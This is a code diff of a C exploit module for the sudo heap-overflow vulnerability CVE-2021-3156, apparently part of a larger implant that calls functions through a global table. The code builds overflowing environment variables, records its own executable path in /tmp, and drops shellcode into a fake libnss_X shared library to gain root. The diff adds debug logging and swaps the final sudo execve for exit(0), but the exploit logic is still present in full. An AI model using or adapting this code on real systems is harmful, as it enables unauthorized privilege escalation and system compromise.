@@ -5,8 +5,11 @@
 #define TARGET_OFFSET_START 0x786
 #define TMP_PATH "/tmp/present"
 #define PATH_LEN 255
+#define SHELL_PATH "./libnss_X/X1234.so.2"
 
 char *env_var(char *var, int overflow_len, char c) {
+  DEBUG_LOG("Creating env_var %s with overflow %d\n", var, overflow_len);
+
   int len = global->strlen(var);
   char *p = global->calloc(len + overflow_len + 1, sizeof(char));
   global->memcpy(p, var, len);
@@ -15,32 +18,43 @@ char *env_var(char *var, int overflow_len, char c) {
 }
 
 void write_exe_to_tmp() {
+  DEBUG_LOG("Writing file\n");
   FILE *tmp = global->fopen(TMP_PATH, "w");
   CHECK(tmp == 0);
   char path[PATH_LEN] = {0};
 
   CHECK(global->readlink("/proc/self/exe", path, sizeof path) == -1);
-  CHECK(global->fwrite(path, sizeof(char), strlen(path), tmp) == 0);
+  CHECK(global->fwrite(path, sizeof(char), global->strlen(path), tmp) == 0);
 
-  DEBUG_LOG("write cwd %s to %s", path, TMP_PATH);
-  fclose(tmp);
+  global->fclose(tmp);
+  DEBUG_LOG("write cwd %s to %s\n", path, TMP_PATH);
 }
 
 void drop_shell() {
-  FILE *p = global->fopen("libnss_X/X1234.so.2", "w");
+  DEBUG_LOG("Dropping shell code\n");
+
+  global->mkdir(SHELL_PATH, 0777);
+  FILE *p = global->fopen(SHELL_PATH, "w");
+
+  CHECK(p == 0);
+
+  DEBUG_LOG("%d\n", sizeof(SHELLCODE_BIN) / sizeof(char));
   global->fwrite(SHELLCODE_BIN, sizeof(char),
                  sizeof(SHELLCODE_BIN) / sizeof(char), p);
   global->fclose(p);
+  DEBUG_LOG("Dropper finished");
 }
 
-void try_get_root(void *g) {
-  global = (Globals *)g;
+void try_get_root(Globals *glob) {
+  global = glob;
+  DEBUG_LOG("%x Checking for root\n");
+
   if (global->geteuid() == 0) {
-    DEBUG_LOG("Running as root!");
+    DEBUG_LOG("Running as root!\n");
     return;
   }
 
-  DEBUG_LOG("Trying to gain root");
+  DEBUG_LOG("Trying to gain root\n");
 
   // https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss_manual.py
   char *A = global->calloc(0xe0 + 1 + 1, sizeof(char));
@@ -85,5 +99,6 @@ void try_get_root(void *g) {
   write_exe_to_tmp();
   drop_shell();
 
-  global->execve("/usr/bin/sudo", e_argv, envp);
+  //  global->execve("/usr/bin/sudo", e_argv, envp);
+  global->exit(0);
 }
